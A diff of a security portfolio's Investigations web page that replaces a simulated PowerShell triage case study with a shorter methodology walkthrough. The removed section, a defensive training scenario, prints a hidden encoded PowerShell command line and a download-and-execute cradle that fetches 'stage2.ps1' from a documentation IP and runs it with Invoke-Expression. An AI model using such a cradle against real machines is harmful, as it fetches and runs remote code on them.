@@ -6,10 +6,10 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
-        <meta name="description" content="Defensive Operations, Threat Analysis & Security Testing">
+        <meta name="description" content="A personal cybersecurity portfolio and practical knowledge base.">
       
       
-        <meta name="author" content="Privacy Skill Vault">
+        <meta name="author" content="Saju Varghese">
       
       
         <link rel="canonical" href="https://privacyskillvault.com/investigations/">
@@ -25,7 +25,7 @@
       
       
       <link rel="icon" href="../assets/branding/favicon.ico">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.8.0">
     
     
       
@@ -33,10 +33,10 @@
       
     
     
-      <link rel="stylesheet" href="../assets/stylesheets/main.ec1eaa64.min.css">
+      <link rel="stylesheet" href="../assets/stylesheets/main.57a0d79d.min.css">
       
         
-        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+        <link rel="stylesheet" href="../assets/stylesheets/palette.fb2fffe2.min.css">
       
       
 
@@ -73,7 +73,7 @@
     
     
     
-    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="slate" data-md-color-accent="indigo">
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="slate" data-md-color-accent="blue">
   
     
     <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
@@ -82,7 +82,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#operational-investigations-threat-triage" class="md-skip">
+        <a href="#investigations" class="md-skip">
           Skip to content
         </a>
       
@@ -94,92 +94,27 @@
     
       <header class="md-header" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="header.title">
-
-    <!-- Left: Brand Logo & Title -->
-    <a href="https://privacyskillvault.com/"
-       title="Privacy Skill Vault"
-       class="md-header__button md-logo"
-       aria-label="Privacy Skill Vault">
-
-      <img src="../assets/branding/PSV-colored.png" alt="Privacy Skill Vault Logo">
-
+    <a href="https://privacyskillvault.com/" title="Privacy Skill Vault" class="md-header__button md-logo" aria-label="Privacy Skill Vault">
+      <img src="../assets/branding/PSV-colored.png" alt="Privacy Skill Vault logo">
     </a>
-
-    <div class="md-header__title" data-md-component="header-title">
-      <div class="md-header__ellipsis">
-        <span class="psv-brand-title">Privacy Skill Vault</span>
-      </div>
-    </div>
-
-
-    <!-- Right: Global Navigation -->
-    <nav id="psv-global-nav" class="psv-global-nav" aria-label="Global Navigation">
-
+    <div class="md-header__title" data-md-component="header-title"><div class="md-header__ellipsis"><span class="psv-brand-title">Privacy Skill Vault</span></div></div>
+    <nav id="psv-global-nav" class="psv-global-nav" aria-label="Global navigation">
       <ul class="psv-global-nav__list">
-
-        <li class="psv-global-nav__item">
-          <a href=".."
-             class="psv-global-nav__link">
-            Home
-          </a>
-        </li>
-
-        <li class="psv-global-nav__item">
-          <a href="../learn/"
-             class="psv-global-nav__link">
-            Learn
-          </a>
-        </li>
-
-        <li class="psv-global-nav__item">
-          <a href="../labs/"
-             class="psv-global-nav__link">
-            Labs
-          </a>
-        </li>
-
-        <li class="psv-global-nav__item">
-          <a href="./"
-             class="psv-global-nav__link psv-global-nav__link--active">
-            Investigations
-          </a>
-        </li>
-
-        <li class="psv-global-nav__item">
-          <a href="../tools/"
-             class="psv-global-nav__link">
-            Tools
-          </a>
-        </li>
-
-        <li class="psv-global-nav__item">
-          <a href="../blog/"
-             class="psv-global-nav__link">
-            Blog
-          </a>
-        </li>
-
-              <li class="psv-global-nav__item">
-          <a href="../about/"
-             class="psv-global-nav__link psv-global-nav__link--about">
-            About
-          </a>
-        </li>
-
+        <li><a href=".." class="psv-global-nav__link">Home</a></li>
+        <li><a href="../about/" class="psv-global-nav__link">About</a></li>
+        <li><a href="../learn/" class="psv-global-nav__link">Learn</a></li>
+        <li><a href="../labs/" class="psv-global-nav__link">Labs</a></li>
+        <li><a href="./" class="psv-global-nav__link psv-global-nav__link--active">Investigations</a></li>
+        <li><a href="../tools/" class="psv-global-nav__link">Tools</a></li>
+        <li><a href="../blog/" class="psv-global-nav__link">Blog</a></li>
       </ul>
-
     </nav>
-
-
-    <!-- Native Theme Switch -->
-    
-      
-        <form class="md-header__option" data-md-component="palette">
+    <form class="md-header__option" data-md-component="palette">
   
     
     
     
-    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="slate" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="slate" data-md-color-accent="blue"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
     
       <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
@@ -189,7 +124,7 @@
     
     
     
-    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="slate" data-md-color-accent="cyan"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="slate" data-md-color-accent="blue"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
     
       <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
@@ -197,49 +132,10 @@
     
   
 </form>
-      
-    
-
-
-    <!-- Accessible Mobile Navigation Toggle -->
-    <button
-      type="button"
-      class="psv-mobile-menu-toggle"
-      aria-expanded="false"
-      aria-controls="psv-global-nav"
-      aria-label="Toggle navigation menu"
-      onclick="
-        const nav = document.getElementById('psv-global-nav');
-        const isOpen = nav.classList.toggle('psv-global-nav--open');
-        this.setAttribute('aria-expanded', isOpen ? 'true' : 'false');
-      "
-      onkeydown="
-        if (event.key === 'Enter' || event.key === ' ') {
-          event.preventDefault();
-          const nav = document.getElementById('psv-global-nav');
-          const isOpen = nav.classList.toggle('psv-global-nav--open');
-          this.setAttribute('aria-expanded', isOpen ? 'true' : 'false');
-        }
-      "
-    >
-      <svg
-        xmlns="http://www.w3.org/2000/svg"
-        viewBox="0 0 24 24"
-        width="24"
-        height="24"
-        fill="none"
-        stroke="currentColor"
-        stroke-width="2"
-        stroke-linecap="round"
-        stroke-linejoin="round">
-
-        <line x1="3" y1="12" x2="21" y2="12"></line>
-        <line x1="3" y1="6" x2="21" y2="6"></line>
-        <line x1="3" y1="18" x2="21" y2="18"></line>
-
-      </svg>
+    <button type="button" class="psv-mobile-menu-toggle" aria-expanded="false" aria-controls="psv-global-nav" aria-label="Toggle navigation menu"
+      onclick="const nav=document.getElementById('psv-global-nav');const open=nav.classList.toggle('psv-global-nav--open');this.setAttribute('aria-expanded',open?'true':'false');">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
     </button>
-
   </nav>
 </header>
     
@@ -308,8 +204,46 @@
   
   
     <li class="md-nav__item">
-      <a href="../learn/" class="md-nav__link">
+      <a href="../about/" class="md-nav__link">
         
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    About
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
   
   
   <span class="md-ellipsis">
@@ -323,7 +257,191 @@
   
   
 
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Learn
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../learn/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
       </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../learn/d01/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    D01 - Infrastructure & Platform Foundation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../learn/d02/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    D02 - Security Monitoring & Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../learn/d03/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    D03 - Offensive Security & Testing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../learn/d04/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    D04 - Security Operations & Investigations
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../learn/d05/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    D05 - Operations, Maintenance & Capstone
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
     </li>
   
 
@@ -422,34 +540,84 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#featured-case-study-id-inv-024" class="md-nav__link">
+  <a href="#evidence-standard" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Featured Case Study — ID: INV-024
+        Evidence standard
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Featured Case Study — ID: INV-024">
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#worked-example-suspicious-powershell-launched-by-a-scheduled-task" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Worked example: suspicious PowerShell launched by a scheduled task
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Worked example: suspicious PowerShell launched by a scheduled task">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#investigating-obfuscated-powershell-execution-via-scheduled-tasks" class="md-nav__link">
+  <a href="#initial-alert" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Investigating Obfuscated PowerShell Execution via Scheduled Tasks
+        Initial alert
       
     </span>
   </a>
   
 </li>
         
-        <li class="md-nav__item">
-    <a href="../about/" class="md-nav__link md-nav__link--about">
-      <span class="md-ellipsis">About</span>
-    </a>
-  </li>
-</ul>
+          <li class="md-nav__item">
+  <a href="#investigation-questions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Investigation questions
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#evidence-to-correlate" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Evidence to correlate
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-reasoning" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Example reasoning
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#possible-outcomes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Possible outcomes
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
     </nav>
   
 </li>
@@ -543,22 +711,77 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#featured-case-study-id-inv-024" class="md-nav__link">
+  <a href="#evidence-standard" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Featured Case Study — ID: INV-024
+        Evidence standard
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Featured Case Study — ID: INV-024">
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#worked-example-suspicious-powershell-launched-by-a-scheduled-task" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Worked example: suspicious PowerShell launched by a scheduled task
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Worked example: suspicious PowerShell launched by a scheduled task">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#investigating-obfuscated-powershell-execution-via-scheduled-tasks" class="md-nav__link">
+  <a href="#initial-alert" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Investigating Obfuscated PowerShell Execution via Scheduled Tasks
+        Initial alert
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#investigation-questions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Investigation questions
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#evidence-to-correlate" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Evidence to correlate
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#example-reasoning" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Example reasoning
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#possible-outcomes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Possible outcomes
       
     </span>
   </a>
@@ -581,120 +804,66 @@
           
             <div class="md-content" data-md-component="content">
               
-              <article class="md-content__inner md-typeset"><article class="md-content__inner md-typeset">
+              <article class="md-content__inner md-typeset">
                 
                   
 
 
 
-<h1 id="operational-investigations-threat-triage">Operational Investigations &amp; Threat Triage<a class="headerlink" href="#operational-investigations-threat-triage" title="Permanent link">&para;</a></h1>
-<p>Structured walkthroughs of alert triage, raw log correlation, and forensic analysis across simulated threat scenarios. Documenting investigation methodologies, detection logic, and false-positive reduction.</p>
-<div class="admonition info"><p class="admonition-title">Scenario and evidence note</p><p>The featured PowerShell case uses the documentation-only address <code>192.0.2.45</code> (TEST-NET-1). Treat it as an illustrative training scenario, not evidence of a real incident. Adapt the workflow to validated telemetry in an authorized environment.</p></div>
-<div class="psv-investigation-filter-list" aria-label="Investigation categories">
-  <span class="md-button md-button--primary">All investigations</span>
-  <span class="md-button">SIEM &amp; Log Analysis</span>
-  <span class="md-button">Network &amp; PCAP</span>
-  <span class="md-button">Endpoint Telemetry</span>
-</div>
-<p class="psv-filter-note">Category labels are descriptive. Open a report to explore its investigation details.</p>
-
-<hr />
-<h2 id="featured-case-study-id-inv-024">Featured Case Study — ID: INV-024<a class="headerlink" href="#featured-case-study-id-inv-024" title="Permanent link">&para;</a></h2>
-<h3 id="investigating-obfuscated-powershell-execution-via-scheduled-tasks">Investigating Obfuscated PowerShell Execution via Scheduled Tasks<a class="headerlink" href="#investigating-obfuscated-powershell-execution-via-scheduled-tasks" title="Permanent link">&para;</a></h3>
-<div style="display: flex; gap: var(--psv-space-2); flex-wrap: wrap; margin-bottom: var(--psv-space-4);">
-  <span style="background: rgba(245, 158, 11, 0.1); color: var(--psv-warning); border: 1px solid var(--psv-warning); font-size: 0.65rem; font-weight: 700; padding: 2px 8px; border-radius: var(--psv-radius-sm);">
-    Severity: Medium
-  </span>
-  <span style="background: rgba(16, 185, 129, 0.1); color: var(--psv-success); border: 1px solid var(--psv-success); font-size: 0.65rem; font-weight: 700; padding: 2px 8px; border-radius: var(--psv-radius-sm);">
-    Status: Closed / Resolved
-  </span>
-  <span style="background: rgba(56, 189, 248, 0.1); color: var(--psv-accent); border: 1px solid var(--psv-accent); font-size: 0.65rem; font-weight: 700; padding: 2px 8px; border-radius: var(--psv-radius-sm);">
-    Category: Host Telemetry &amp; SIEM
-  </span>
-</div>
-
-<div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: var(--psv-space-6); font-size: 0.825rem;">
-
-  <div>
-    <div class="psv-card" style="margin-bottom: var(--psv-space-4);">
-      <h3 style="color: var(--psv-accent); font-size: 0.95rem; margin-top: 0; margin-bottom: var(--psv-space-3);">
-        1. Incident Trigger &amp; Initial Context
-      </h3>
-      <ul>
-        <li><strong>Alert Name:</strong> <code>SUSPICIOUS_POWERSHELL_BASE64_EXEC</code></li>
-        <li><strong>Trigger Source:</strong> Windows Security Event Log (Event ID 4688) on endpoint <code>HOST-FIN-02</code>.</li>
-        <li><strong>Initial Observation:</strong> An automated SIEM alert flagged an obfuscated PowerShell command executing under the SYSTEM account outside standard maintenance hours.</li>
-      </ul>
-    </div>
-
-    <div class="psv-card">
-      <h3 style="color: var(--psv-accent); font-size: 0.95rem; margin-top: 0; margin-bottom: var(--psv-space-3);">
-        3. Investigation &amp; Triage Workflow
-      </h3>
-      <ol>
-        <li><strong>Payload Decoding:</strong> Extracted the Base64 string from Sysmon Event ID 1 and decoded the payload using CyberChef to identify the outbound destination.</li>
-        <li><strong>Parent-Child Process Analysis:</strong> Verified that <code>powershell.exe</code> was spawned directly by <code>taskeng.exe</code> (Windows Scheduled Tasks Engine), confirming automated persistence rather than interactive execution.</li>
-        <li><strong>Network Telemetry Correlation:</strong> Cross-referenced network firewall logs for outbound connections to <code>192.0.2.45</code>. Identified 12 outbound connection attempts within a 3-minute window.</li>
-        <li><strong>Host Verification:</strong> Interviewed the system administration team and checked local task scheduler definitions. Confirmed an unannounced legacy maintenance script was executing without updated service account encapsulation.</li>
-      </ol>
-    </div>
-  </div>
-
-  <div>
-    <div class="psv-card" style="margin-bottom: var(--psv-space-4);">
-      <h3 style="color: var(--psv-accent); font-size: 0.95rem; margin-top: 0; margin-bottom: var(--psv-space-3);">
-        2. Telemetry &amp; Log Evidence
-      </h3>
-
-      <p style="font-size: 0.75rem; color: var(--psv-text-muted); margin-bottom: 4px;"><strong>Sysmon Event ID 1 (Process Creation):</strong></p>
-
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>UtcTime: 2026-07-12 02:14:08.112
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>ProcessId: 4820
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>CommandLine: powershell.exe -NoP -NonI -W Hidden -e aXdX... [Base64 Truncated]
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>ParentImage: C:\Windows\System32\taskeng.exe
-</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>User: NT AUTHORITY\SYSTEM
-</span></code></pre></div>
-
-      <p style="font-size: 0.75rem; color: var(--psv-text-muted); margin-top: 8px; margin-bottom: 4px;"><strong>Script Block Logging (Windows Event ID 4104) Decoded Payload:</strong></p>
-
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nv">$cli</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span>
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="nv">$data</span> <span class="p">=</span> <span class="nv">$cli</span><span class="p">.</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">'http://192.0.2.45/stage2.ps1'</span><span class="p">)</span>
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="nb">Invoke-Expression</span> <span class="nv">$data</span>
-</span></code></pre></div>
-
-    </div>
-
-    <div class="psv-card">
-      <h3 style="color: var(--psv-accent); font-size: 0.95rem; margin-top: 0; margin-bottom: var(--psv-space-3);">
-        4. Root Cause &amp; Detection Tuning
-      </h3>
-
-      <p style="color: var(--psv-text-muted); margin-bottom: var(--psv-space-2);">
-        <strong>Verdict:</strong> Authorized Administrator Misconfiguration (True Positive for policy violation, False Positive for active malware).
-      </p>
-
-      <strong style="color: var(--psv-text); font-size: 0.75rem; display: block; margin-bottom: var(--psv-space-1);">Remediation &amp; Detection Tuning:</strong>
-
-      <ul>
-        <li>Reconfigured the admin task to run via a dedicated service account with restricted privileges.</li>
-        <li>Updated the SIEM detection rule to alert specifically on unquoted administrative script paths while keeping base-64 PowerShell flags flagged for non-standard parent processes.</li>
-      </ul>
-    </div>
-  </div>
-
-</div>
+<h1 id="investigations">Investigations<a class="headerlink" href="#investigations" title="Permanent link">&para;</a></h1>
+<p>Defensive investigation methods and worked examples covering security alerts, endpoint activity, network evidence, and cyber-fraud signals.</p>
+<h2 id="evidence-standard">Evidence standard<a class="headerlink" href="#evidence-standard" title="Permanent link">&para;</a></h2>
+<p>Every report must distinguish observed evidence from interpretation. Published material is classified as sanitised professional experience, lab investigation, simulated scenario, or research note. No customer records, internal banking details, production IP addresses, or employer-confidential information belong here.</p>
+<h2 id="worked-example-suspicious-powershell-launched-by-a-scheduled-task">Worked example: suspicious PowerShell launched by a scheduled task<a class="headerlink" href="#worked-example-suspicious-powershell-launched-by-a-scheduled-task" title="Permanent link">&para;</a></h2>
+<p><badge>SIMULATED TRAINING SCENARIO</badge></p>
+<p>Hostnames, timestamps, commands, and indicators in this example are synthetic. It does not describe a real customer, employer, or production incident.</p>
+<h3 id="initial-alert">Initial alert<a class="headerlink" href="#initial-alert" title="Permanent link">&para;</a></h3>
+<p>A monitoring rule flags encoded PowerShell launched by a scheduled-task process outside an expected maintenance window.</p>
+<h3 id="investigation-questions">Investigation questions<a class="headerlink" href="#investigation-questions" title="Permanent link">&para;</a></h3>
+<ol>
+<li>What process created PowerShell, and what was its full command line?</li>
+<li>Which account and integrity level were involved?</li>
+<li>Is the scheduled task known, approved, and correctly owned?</li>
+<li>Do script-block, process, DNS, proxy, and firewall records corroborate the activity?</li>
+<li>Is there evidence of payload retrieval, persistence, lateral movement, or impact?</li>
+</ol>
+<h3 id="evidence-to-correlate">Evidence to correlate<a class="headerlink" href="#evidence-to-correlate" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Process creation telemetry, including parent process and command line</li>
+<li>PowerShell operational events where logging is enabled</li>
+<li>Scheduled-task registration and execution history</li>
+<li>DNS and network connection records</li>
+<li>File creation, hash, signature, and reputation context</li>
+<li>Change records and owner confirmation</li>
+</ul>
+<h3 id="example-reasoning">Example reasoning<a class="headerlink" href="#example-reasoning" title="Permanent link">&para;</a></h3>
+<p>An encoded command is a triage signal, not proof of malware. A scheduled task can be legitimate administration or unauthorised persistence. Validate the task definition, executable path, script contents, account, creation time, change history, and network destinations before assigning a verdict.</p>
+<h3 id="possible-outcomes">Possible outcomes<a class="headerlink" href="#possible-outcomes" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>Expected administration:</strong> document the owner and maintenance purpose; tune narrowly with evidence.</li>
+<li><strong>Policy violation:</strong> remediate the configuration even if malicious intent is not established.</li>
+<li><strong>Likely compromise:</strong> follow incident-response procedures, preserve evidence, and consider containment under organisational policy.</li>
+<li><strong>Insufficient evidence:</strong> state what telemetry is missing and what additional collection is required.</li>
+</ul>
+<p>Avoid treating one event or one indicator as a complete story. Record confidence, alternative explanations, data gaps, and the basis for every conclusion.</p>
 
 
-<h2>All Investigation Reports</h2>
-<p>In-depth write-ups, detection engineering notes, and operational analysis.</p>
-<div class="psv-investigation-reports">
-<div class="psv-investigation-report" data-category="siem"><div class="psv-investigation-report__meta"><span class="psv-investigation-id">INV-023</span><span class="psv-investigation-category">SIEM Analysis</span></div><h3>Analyzing Privilege Escalation via Token Manipulation</h3><p>Examining Windows Event ID 4672 and process access rights during unauthorized token impersonation attempts.</p><div class="psv-investigation-report__footer"><span>May 18, 2026 · 12 min read</span><a href="https://investigations.privacyskillvault.com/">Read Investigation →</a></div></div>
-<div class="psv-investigation-report" data-category="network"><div class="psv-investigation-report__meta"><span class="psv-investigation-id">INV-022</span><span class="psv-investigation-category">Network &amp; PCAP</span></div><h3>Detecting Beaconing Traffic Using Suricata &amp; Zeek Logs</h3><p>Identifying periodic outbound connections and domain generation patterns from compromised hosts in a controlled lab.</p><div class="psv-investigation-report__footer"><span>May 16, 2026 · 15 min read</span><a href="https://investigations.privacyskillvault.com/">Read Investigation →</a></div></div>
-<div class="psv-investigation-report" data-category="endpoint"><div class="psv-investigation-report__meta"><span class="psv-investigation-id">INV-021</span><span class="psv-investigation-category">Endpoint Telemetry</span></div><h3>Malicious DLL Sideloading via Unsigned Service Execution</h3><p>Investigating DLL search order hijacking and service persistence using Sysmon and Windows Event Logs.</p><div class="psv-investigation-report__footer"><span>May 12, 2026 · 14 min read</span><a href="https://investigations.privacyskillvault.com/">Read Investigation →</a></div></div>
-</div>
-<section class="psv-investigations-cta"><div><p class="psv-investigations-cta__eyebrow">CONTINUE THE INVESTIGATION</p><h2>Explore the Investigations Vault</h2><p>Open the full collection of investigation notes and technical walkthroughs.</p></div><a class="md-button md-button--primary" href="https://investigations.privacyskillvault.com/" target="_blank" rel="noopener">Open Investigations Vault →</a></section></div>
-            </article><script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
         </div>
         
           <button type="button" class="md-top md-icon" data-md-component="top" hidden>
@@ -732,12 +901,14 @@
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": ["navigation.instant", "navigation.tracking", "navigation.top", "content.code.copy", "content.action.view"], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": ["navigation.instant", "navigation.tracking", "navigation.top", "content.code.copy", "content.action.view"], "search": "../assets/javascripts/workers/search.a7633da7.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="../assets/javascripts/bundle.d7400e89.min.js"></script>
+      <script src="../assets/javascripts/bundle.c21346df.min.js"></script>
       
         <script src="../javascripts/psv-navigation.js"></script>
+      
+        <script src="../javascripts/tools.js"></script>
       
     
   </body>
